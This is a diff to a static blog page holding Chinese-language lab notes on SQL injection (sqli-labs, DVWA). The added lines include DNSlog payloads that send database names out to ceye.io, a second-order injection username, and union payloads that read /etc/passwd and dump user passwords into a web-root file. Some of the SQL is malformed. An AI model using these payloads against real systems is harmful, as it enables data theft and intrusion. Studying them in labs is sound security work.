@@ -26,7 +26,7 @@
 <meta property="og:description" content="注入(injection) 显示注入,会将结果显示在网页上 使用 1’  来测试是否有显示注入漏洞(返回语法错误)12You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;#x27">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-11-07T11:59:41.000Z">
-<meta property="article:modified_time" content="2024-11-12T11:08:51.504Z">
+<meta property="article:modified_time" content="2024-11-12T12:59:12.733Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="networingSecurity">
 <meta name="twitter:card" content="summary">
@@ -264,8 +264,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-12 19:08:51</span>
-            <span class="mobile">2024-11-12 19:08:51</span>
+            <span class="desktop">2024-11-12 20:59:12</span>
+            <span class="mobile">2024-11-12 20:59:12</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -329,16 +329,36 @@
 </li>
 </ul>
 </li>
-<li>DNSlog注入<ul>
+<li>DNSlog<ul>
 <li>加快速度获取信息<ol>
-<li>把数据送入DNS日志里面</li>
+<li>把数据送入DNS日志里面(ceye.io)</li>
 </ol>
 </li>
 <li>前置条件苛刻<ol>
-<li>数据库会进行域名解析操作<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(<span class="string">&#x27;\\\\&#x27;</span>,database(),.github.io,<span class="string">&#x27;\\abc&#x27;</span>)</span><br></pre></td></tr></table></figure></div></li>
+<li>数据库会进行域名解析操作<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="number">1</span>, <span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,database(),.ceye.io,<span class="string">&#x27;\\abc&#x27;</span> #))</span><br><span class="line"># 返回结果:ceye上回显示当前数据库名字.ceye.io\abc</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="number">1</span>, <span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> schema_name  <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),.ceye.io,<span class="string">&#x27;\\abc&#x27;</span> #))</span><br></pre></td></tr></table></figure></div></li>
 </ol>
 </li>
 </ul>
+</li>
+<li>二阶注入(sqli-lab24)<ol>
+<li>插入恶意数据</li>
+<li>使用恶意数据<br>在注册时使用<code>admin&#39;#</code>用户名,密码随便填<br>修改密码时直接填入新的密码</li>
+</ol>
+</li>
+<li>宽字节注入(sqli-lab32)<ul>
+<li>数据库采用GBK编码时所产生的漏洞,这个漏洞通过网站转义</li>
+<li>GBK编码将一个汉字编成两个码字</li>
+</ul>
+</li>
+<li>堆叠注入攻击(sqli-lab38)<ul>
+<li>利用分号执行多条语句</li>
+</ul>
+</li>
+<li>利用sql注入读写文件(显注)<ol>
+<li>读文件<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,load_file(&quot;/etc/passwd&quot;); #</span><br></pre></td></tr></table></figure></div></li>
+<li>写文件<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> dvwa.user <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/1.bak&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
+</ol>
 </li>
 </ul>
 
@@ -355,7 +375,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-11-12 19:08:51
+                    :</strong> 2024-11-12 20:59:12
             </li>
         
         <li>
